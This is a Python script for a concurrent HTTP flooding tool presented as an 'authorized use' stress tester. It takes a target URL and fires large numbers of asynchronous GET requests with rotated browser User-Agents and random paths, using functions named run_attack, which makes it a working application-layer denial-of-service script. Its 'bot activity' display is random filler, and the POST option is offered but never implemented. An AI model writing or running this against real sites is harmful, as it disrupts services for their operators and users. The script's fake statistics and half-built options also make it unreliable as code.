import asyncio
import aiohttp
import time
import random
import threading
import logging
import string
import psutil
from colorama import Fore, init
from rich.console import Console
from rich.progress import Progress
from rich.table import Table
from rich.panel import Panel
from rich.markdown import Markdown
from rich.spinner import Spinner
from tqdm import tqdm
import re

# Initialize colorama for colorful terminal output
init(autoreset=True)

# Setup logging for debugging and analysis
logging.basicConfig(filename="stress_test.log", level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Global counters for statistics
success_count = 0
failure_count = 0
current_thread_count = 0

# Initialize rich console for better terminal output
console = Console()

# Advanced ASCII Banner for the tool
def display_banner():
    console.print(Fore.CYAN + r"""
   ███████╗████████╗███████╗███████╗███████╗    
   ██╔════╝╚══██╔══╝██╔════╝██╔════╝██╔════╝    
   █████╗     ██║   █████╗  █████╗  █████╗      
   ██╔══╝     ██║   ██╔══╝  ██╔══╝  ██╔══╝      
   ██║        ██║   ███████╗██║     ███████╗    
   ╚═╝        ╚═╝   ╚══════╝╚═╝     ╚══════╝    
   Advanced Stress Tester v3.0 - For Authorized Use Only
    """)

# Display Real-Time System Stats (CPU, Memory, Disk Usage)
def system_stats():
    while True:
        cpu_usage = psutil.cpu_percent()
        memory_usage = psutil.virtual_memory().percent
        disk_usage = psutil.disk_usage('/').percent
        uptime = time.strftime("%H:%M:%S", time.gmtime(time.time() - psutil.boot_time()))

        # Clear screen for fresh output
        console.clear()
        
        # Create a panel with the system stats
        panel = Panel(f"[bold]System Stats[/bold]\n"
                      f"Uptime: {uptime}\n"
                      f"CPU: {cpu_usage}% | Memory: {memory_usage}% | Disk: {disk_usage}%", 
                      title="System Information", border_style="blue")
        console.print(panel)

        # Display real-time network stats and bot activity
        bot_activity = random.randint(50, 100)  # Simulate bot activity for visualization
        threat_level = "Low" if bot_activity < 60 else "Medium" if bot_activity < 80 else "High"

        # Show bot activity
        table = Table(show_header=True, header_style="bold green", title="Bot Activity")
        table.add_column("Metric", justify="center", style="cyan")
        table.add_column("Value", justify="center", style="yellow")
        table.add_row("Activity", f"{bot_activity}%")
        table.add_row("Threat Level", f"{threat_level}")
        
        console.print(table)

        time.sleep(2)  # Update every 2 seconds

# Matrix-Style Animation for enhanced visuals
def matrix_animation(duration=3):
    chars = ["|", "/", "-", "\\"]
    end_time = time.time() + duration
    while time.time() < end_time:
        console.print(Fore.GREEN + random.choice(chars), end="\r", flush=True)
        time.sleep(0.1)

# Randomize URL paths for realism
def generate_random_path():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

# Asynchronous request sender with method control
async def send_request(session, url, headers=None, method="GET"):
    global success_count, failure_count
    try:
        if method == "GET":
            async with session.get(url, headers=headers, timeout=10) as response:
                if response.status == 200:
                    success_count += 1
                    logging.info(f"GET request successful: {url} | Status: {response.status}")
                else:
                    failure_count += 1
                    logging.error(f"GET request failed: {url} | Status: {response.status}")
    except Exception as e:
        failure_count += 1
        logging.error(f"Request error: {e}")
        console.print(Fore.RED + f"[Failure] Error: {e}")

# Function to generate dynamic headers for requests
def generate_headers():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }

# Function to send requests using asyncio
async def run_attack(target_url, method, max_concurrent_requests, total_requests):
    semaphore = asyncio.Semaphore(max_concurrent_requests)
    async with aiohttp.ClientSession() as session:
        tasks = [
            send_request_with_semaphore(session, target_url, semaphore, method)
            for _ in tqdm(range(total_requests), desc="Sending Requests", ncols=100)
        ]
        await asyncio.gather(*tasks)

# Semaphore-wrapped request sender
async def send_request_with_semaphore(session, url, semaphore, method):
    async with semaphore:
        headers = generate_headers()
        url_with_path = f"{url}/{generate_random_path()}"
        await send_request(session, url_with_path, headers, method)

# Thread worker function
def thread_worker(target_url, method, max_concurrent_requests, total_requests):
    asyncio.run(run_attack(target_url, method, max_concurrent_requests, total_requests))

# Monitor real-time statistics
def monitor_network():
    global success_count, failure_count
    while True:
        total = success_count + failure_count
        if total > 0:
            success_rate = (success_count / total) * 100
            console.print(
                Fore.CYAN + f"\n[Stats] Total Requests: {total} | Success Rate: {success_rate:.2f}% | Success: {success_count} | Failures: {failure_count}",
                style="bold green"
            )
        time.sleep(5)

# Validate URL
def validate_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # ...or ipv4
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # ...or ipv6
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

# Main function
def main():
    global success_count, failure_count

    # Display the banner
    display_banner()

    # User input for parameters with validation
    while True:
        target_url = input(Fore.CYAN + "Enter Target URL (e.g., http://yourserver.com): ").strip()
        if validate_url(target_url):
            break
        else:
            console.print(Fore.RED + "Invalid URL. Please enter a valid URL.")

    while True:
        method = input(Fore.CYAN + "Choose HTTP Method (GET or POST): ").strip().upper()
        if method in ["GET", "POST"]:
            break
        else:
            console.print(Fore.RED + "Invalid HTTP method. Please enter either 'GET' or 'POST'.")

    while True:
        try:
            max_concurrent_requests = int(input(Fore.CYAN + "Enter Max Concurrent Requests: "))
            total_requests = int(input(Fore.CYAN + "Enter Total Requests: "))
            if max_concurrent_requests > 0 and total_requests > 0:
                break
            else:
                console.print(Fore.RED + "Both values must be greater than 0.")
        except ValueError:
            console.print(Fore.RED + "Please enter valid numbers.")

    # Start the monitoring thread for real-time stats
    threading.Thread(target=monitor_network, daemon=True).start()

    # Start system stats thread
    threading.Thread(target=system_stats, daemon=True).start()

    # Start attack in a separate thread
    threading.Thread(target=thread_worker, args=(target_url, method, max_concurrent_requests, total_requests), daemon=True).start()

    # Run matrix animation during the attack
    matrix_animation(duration=10)

if __name__ == "__main__":
    main()
